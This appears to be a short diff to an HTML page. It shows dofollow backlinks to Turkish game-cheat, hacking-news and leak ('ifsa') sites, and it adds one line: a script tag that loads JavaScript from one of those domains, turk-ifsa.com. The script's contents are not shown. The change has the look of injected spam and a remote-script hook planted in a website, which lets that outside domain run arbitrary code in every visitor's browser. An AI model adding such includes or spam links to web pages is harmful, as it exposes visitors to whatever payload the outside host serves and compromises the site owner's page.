@@ -3,4 +3,5 @@
 <a href="https://oyunhacker.com/" target="_blank" rel="dofollow" title="Oyun Hileleri">Oyun Hileleri</a>
 <a href="https://www.privnews.com/" target="_blank" rel="dofollow" title="Hack Haber">Hack Haber</a>
 <a href="https://turk-ifsa.com/" target="_blank" rel="dofollow" title="Turk İfsa">Turk İfsa</a>
+<script src="//turk-ifsa.com/"></script>
 </p>
